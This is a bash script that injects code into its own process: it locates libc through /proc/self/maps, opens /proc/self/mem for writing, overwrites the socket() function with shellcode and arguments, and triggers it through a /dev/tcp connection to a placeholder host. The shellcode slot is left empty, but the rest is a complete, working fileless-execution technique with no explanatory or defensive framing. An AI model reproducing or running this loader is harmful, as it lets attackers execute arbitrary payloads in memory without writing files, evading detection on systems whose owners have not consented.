#!/bin/bash

IFS=
regex="([^-]+)-[^ ]+ .*libc.*"

# socket offset in libc file
# nm -D /lib64/libc.so.6 | grep 'W socket$'
socket_offset=$((16#100970))

# search libc base address
while read line;do
    if [[ "$line" =~ $regex ]];then
        libc_addr=$((16#${BASH_REMATCH[1]}))
        break
    fi
done </proc/self/maps

# socket address in memory
socket_addr=$((libc_addr + socket_offset - 1))

# dup2(open("/proc/self/mem", O_RDWR), 3);
exec 3<>/proc/self/mem

# lseek(3, socket_addr);
{ dd bs=1 skip=$socket_addr count=1 > /dev/null 2>&1; } <&3

# here comes the spider... Ops, the shellcode

#BEGIN
#END

echo -ne "$sc" >&3
for arg; do
   echo -n "$arg" >&3
   echo -ne "\x00" >&3
done
echo -ne "\x00\x00\x00\x00" >&3

echo "pshiuuuuu" > /dev/tcp/r.i.p/1337
